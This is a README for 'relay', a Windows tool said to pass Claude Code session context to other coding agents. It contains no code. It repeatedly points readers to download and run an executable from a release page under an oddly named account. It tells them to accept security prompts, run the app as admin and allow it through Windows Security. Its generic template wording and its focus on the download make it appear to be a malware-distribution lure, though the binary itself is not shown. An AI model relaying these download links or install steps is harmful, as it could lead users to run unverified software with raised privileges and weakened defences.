# 🔁 relay - Keep work moving across agents

[Download relay for Windows](https://github.com/plundering-jackass936/relay/releases)  
[![Download relay](https://img.shields.io/badge/Download%20relay-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/plundering-jackass936/relay/releases)

## 🧭 What relay does

relay helps you keep working when Claude Code hits a rate limit. It takes your full session context and hands it off to another agent, such as Codex, Gemini, Aider, or other supported tools.

That means you do not need to start over. Your prompt history, task state, and working notes stay with the next agent, so you can keep the same thread of work going.

## 🪟 What you need on Windows

Before you install relay, make sure your PC has:

- Windows 10 or Windows 11
- An internet connection
- Permission to run apps on your computer
- At least 200 MB of free disk space
- Access to Claude Code and at least one supported agent if you plan to use handoff

If you are not sure which file to use, choose the Windows release file that ends in `.exe` or `.msi`.

## 📥 Download relay

Visit this page to download relay for Windows:

[https://github.com/plundering-jackass936/relay/releases](https://github.com/plundering-jackass936/relay/releases)

On the release page:

1. Open the latest release
2. Find the Windows file under Assets
3. Download the file that matches your system
4. Save it to a folder you can find again, such as Downloads

## ⚙️ Install relay

If the release gives you an `.exe` or `.msi` file:

1. Open the file after it finishes downloading
2. If Windows shows a security prompt, choose Run or Yes
3. Follow the setup steps on screen
4. Finish the install
5. Open relay from the Start menu or the folder where you saved it

If the release gives you a `.zip` file:

1. Right-click the file
2. Choose Extract All
3. Open the extracted folder
4. Find the relay app file
5. Double-click it to start

## 🚀 First run

When you open relay for the first time:

1. Sign in to your Claude Code account if needed
2. Pick the agent you want to hand work to
3. Check that your API keys or agent links are set up
4. Run a small test handoff
5. Confirm that the next agent receives the same context

A simple test is best. Start with a short task, then move to a real one after you see it work.

## 🔄 How agent handoff works

relay follows a simple flow:

1. You work in Claude Code
2. Claude Code reaches a rate limit or you want to switch
3. relay gathers your current context
4. relay sends that context to another agent
5. You keep working without rebuilding the whole thread

This helps when your task has:

- A long chat history
- Code notes you do not want to repeat
- File names or paths you need to keep
- Steps that depend on earlier messages
- A task that needs a second model or tool

## 🛠️ Supported agents

relay can hand off to several agents, including:

- Codex
- Gemini
- Aider
- Other supported CLI agents

Each agent has its own setup. Some use an API key. Some use a local command line tool. Some use a connected account. Set up the one you want before you start.

## 🧩 Basic setup tips

To get better handoffs, keep these habits:

- Write short, clear task notes
- Keep file names exact
- Mention what has already been tried
- Save the main goal in one place
- Use the same project folder when possible

Good context makes the next agent more useful. If the task has steps, list them in order before you hand it off.

## 🔐 Accounts and keys

Some agent setups need a key or sign-in. If relay asks for one, use the one from the service you picked.

Typical items you may need:

- Claude Code access
- A Codex account or key
- A Gemini account or key
- An Aider setup
- A local shell or terminal path

If you do not plan to use a certain agent, you do not need to set it up.

## 🧪 Common uses

relay works well for tasks like:

- Switching from Claude Code after rate limits
- Moving a coding job to a second agent
- Keeping a long task moving across tools
- Saving time on repeated setup
- Testing which agent gives the best result for a job

It is most useful when you already have useful context and do not want to rebuild it by hand.

## 🧱 Troubleshooting

If relay does not start:

1. Check that the file finished downloading
2. Make sure Windows did not block the app
3. Try running it as an admin
4. Check that you downloaded the correct Windows file
5. Reboot your PC and try again

If handoff does not work:

1. Check your internet connection
2. Make sure the target agent is set up
3. Confirm that your account is signed in
4. Check for missing keys or tokens
5. Try a smaller test task

If the app opens but shows no context:

1. Confirm you are in the right project folder
2. Check that your session data is saved
3. Make sure the source agent has work to hand off
4. Retry the handoff from a fresh session

## 🖥️ Windows notes

On Windows, relay may work best when you:

- Keep the app in a stable folder like Program Files or Downloads
- Avoid moving the app file after install
- Run it from the same user account each time
- Allow it through Windows Security if asked
- Keep your terminal open if you use CLI agents

If your company laptop has limits on app installs, you may need help from your system admin.

## 📁 Recommended workflow

A simple work flow looks like this:

1. Open Claude Code and do the first part of the job
2. Save the task details
3. Open relay when you hit a limit
4. Choose the next agent
5. Hand off the full context
6. Keep working in the new tool

This works best when you treat relay as part of the same work session, not as a separate step

## 🧭 Example handoff

You might use relay like this:

- You ask Claude Code to inspect a bug
- Claude Code gives you part of the fix
- You hit a rate limit before the full change is done
- relay passes the bug details, file list, and next steps to Gemini
- Gemini finishes the job with the same context

The goal is to stop rework and keep momentum

## 📌 Release page

Use this page to get the latest Windows build:

[https://github.com/plundering-jackass936/relay/releases](https://github.com/plundering-jackass936/relay/releases)

If a new version comes out later, return to the same page and download the newer release

## 🏷️ Topics

agent-handoff, aider, claude-code, cli, codex, context-switching, developer-tools, gemini, llm, rate-limit, rust